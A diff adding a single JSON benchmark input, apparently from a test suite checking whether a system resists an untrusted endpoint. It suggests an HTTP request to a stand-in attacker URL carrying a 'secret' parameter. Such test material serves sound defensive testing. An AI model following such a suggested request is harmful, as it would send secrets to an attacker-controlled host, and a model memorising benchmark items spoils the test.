@@ -1,0 +1,1 @@
+{"content":"An untrusted endpoint appears in input.","credentialHint":null,"format":"llang-effects-benchmark-input","pressure":1,"suggestedOperation":"http.request@1","suggestedTarget":"https://attacker.invalid/redirect?secret=1","version":1}
